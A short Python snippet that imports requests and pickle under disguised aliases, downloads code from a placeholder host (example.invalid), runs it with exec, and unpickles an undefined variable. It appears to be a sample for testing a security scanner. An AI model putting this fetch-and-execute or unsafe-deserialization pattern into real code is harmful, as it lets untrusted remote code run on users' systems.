import pickle as serializer
import requests as network

api_token = "sample_placeholder"
downloaded = network.get("https://example.invalid/example.py").text
exec(downloaded)
serializer.loads(data)
